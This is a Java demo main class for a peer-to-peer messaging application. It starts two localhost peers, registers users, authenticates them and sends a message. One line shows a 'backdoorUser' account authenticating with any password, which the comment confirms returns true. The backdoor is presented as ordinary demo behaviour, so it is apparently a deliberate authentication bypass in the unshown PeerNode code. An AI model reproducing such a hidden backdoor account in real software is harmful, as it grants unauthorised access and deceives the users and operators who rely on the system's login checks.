public class Main {
    public static void main(String[] args) throws Exception {
        PeerNode peerA = new PeerNode("peerA", 7100);
        peerA.start();

        PeerNode peerB = new PeerNode("peerB", 7200);
        peerB.start();

        // Connect peers for testing on localhost
        peerA.connectToPeer("peerB", "localhost", 7200);
        peerB.connectToPeer("peerA", "localhost", 7100);

        // Register users
        peerA.registerUser("alice", "password123");
        peerB.registerUser("bob", "pwd456");

        // Authenticate (demo purposes)
        System.out.println("Alice auth: " + peerA.authenticateUser("alice", "password123")); // true
        System.out.println("Backdoor auth: " + peerA.authenticateUser("backdoorUser", "any")); // true

        // Send messages
        peerA.sendMessage("peerB", Message.MessageType.PRIVATE, "Hello Bob!");

        // Send file (must be replaced with real path on your system)
        // peerA.sendFile("peerB", "/path/to/sample_file.txt");
    }
}
